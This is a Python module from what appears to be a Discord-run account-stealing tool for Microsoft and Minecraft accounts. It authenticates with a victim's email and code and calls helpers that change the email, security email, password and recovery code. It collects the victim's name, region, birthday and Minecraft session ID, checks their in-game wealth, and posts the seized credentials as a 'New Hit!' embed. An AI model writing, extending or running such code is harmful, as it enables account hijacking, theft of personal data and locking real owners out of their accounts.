from views.utils.minecraft.getHypixel import getHypixelStats
from views.utils.minecraft.getDonut import getDonutStats
from views.utils.securing.getLiveData import getLiveData
from views.utils.securing.polishHost import polishHost
from views.utils.minecraft.simplify import simplify
from views.utils.securing.secure import secure
from views.utils.getMSAAUTH import getMSAAUTH
from urllib.parse import quote
from discord import Embed
import httpx
import time

async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
    # Handles the data to be displayed in embeds to discord
    
    data = await getLiveData(session)
    msaauth = await getMSAAUTH(session, email, device, data, code)
    
    account = {
        "microsoft": {
            "email": "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get"
        },
        "minecraft": {
            "name": "Could not find",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }

    initialTime = time.time()
    if not msaauth:
        return msaauth
    elif msaauth == "Family":
        print(f"[X] - Account is Family Locked")
        account["minecraft"]["name"] = "Child Locked"
        account["microsoft"]["email"] = "Child Locked"
        account["microsoft"]["security_email"] = "Child Locked"
    else:
        await polishHost(session, msaauth)
        account = await secure(session, recovery, account)

    finalTime = (time.time() - initialTime)

    name = quote(account["minecraft"]["name"])

    # Microsoft DOB Embed
    info_embed = Embed()
    info_embed.add_field(name="First Name", value=f"```{account["microsoft"]['firstName']}```", inline=False)
    info_embed.add_field(name="Last Name", value=f"```{account["microsoft"]['lastName']}```", inline=True)
    info_embed.add_field(name="Full Name", value=f"```{account["microsoft"]['fullName']}```", inline=False)
    info_embed.add_field(name="Region", value=f"```{account["microsoft"]['region']}```", inline=False)
    info_embed.add_field(name="Birthday", value=f"```{account["microsoft"]['birthday']}```", inline=False)
    
    hstats = await getHypixelStats(name)
    dstats = await getDonutStats(name)

    # Stats
    stats_embed = Embed(color=0x279CF5)
    stats_embed.add_field(name="Rank", value=f'{hstats["rank"]}', inline=True)
    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats["level"])}', inline=True)
    stats_embed.add_field(name="Gifted", value=f'{hstats["gifted"]}', inline=True)
    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats["networth"])}', inline=True)
    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["slevel"])}', inline=True)
    stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats != "Failed" else 0}', inline=True)

    # Account Embed
    hit_embed = Embed(
        title = f"New Hit! Secured in {round(finalTime, 2)}s",
        description = f"[Login](https://login.live.com/) | [Donut](https://www.donutstats.net/player-finder) | [SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | [Plancke](https://plancke.io/hypixel/player/stats/{name}) | [Is Online](https://hypixel.paniek.de/player/{name}/status)",
        color = 0x279CF5
    )
    hit_embed.add_field(name="MC Username", value=f"```{account["minecraft"]['name']}```", inline=False)
    hit_embed.add_field(name="MC Method", value=f"```{account["minecraft"]['method']}```", inline=True)
    hit_embed.add_field(name="MC Capes", value=f"```{account["minecraft"]['capes']}```", inline=True)
    hit_embed.add_field(name="Primary Email", value=f"```{account["microsoft"]['email']}```", inline=False)
    hit_embed.add_field(name="Security Email", value=f"```{account["microsoft"]['security_email']}```", inline=True)
    hit_embed.add_field(name="Password", value=f"```{account["microsoft"]['password']}```", inline=False)
    hit_embed.add_field(name="Secret Key", value=f"```Disabled```", inline=False)
    hit_embed.add_field(name="Recovery Code", value=f"```{account["microsoft"]['recovery_code']}```", inline=False)
    hit_embed.set_footer(text = f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")

    # Minecraft SSID Embed
    ssid_embed = Embed(
        title = "SSID",
        description = f"```{account["minecraft"]['SSID']}```"
    )
    
    if account["minecraft"]["SSID"]:

        microsoft_embed = Embed(
            title = "Minecraft Stats"
        )
        
        microsoft_embed.add_field(name="Name", value=f'{account["minecraft"]['name']}', inline=True)
        microsoft_embed.add_field(name="Changeable", value=f'{account["minecraft"]['uchange']}', inline=True)
        microsoft_embed.add_field(name="Xbox Gamertag", value=f'{account["minecraft"]['gamertag']}', inline=True)

        hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(account["minecraft"]['name'])}/128")

    accountData = {
        "hit_embed": hit_embed,
        "details": {
            "stats_embed": stats_embed,
            "ssid_embed": ssid_embed,
            "info_embed": info_embed,
            "account_details": (
                f"**Username:** {account["minecraft"]['name']}\n"
                f"**Has MC:** {True if account["minecraft"]['SSID'] else False}\n"
                f"**Capes:** {account["minecraft"]['capes']}\n"
                f"**Email:** {account["microsoft"]['email']}\n"
                f"**Security Email:** {account["microsoft"]['security_email']}\n"
                f"**Password:** {account["microsoft"]['password']}\n"
                f"**Recovery Code:** {account["microsoft"]['recovery_code']}"
            )
        }
    }

    return accountData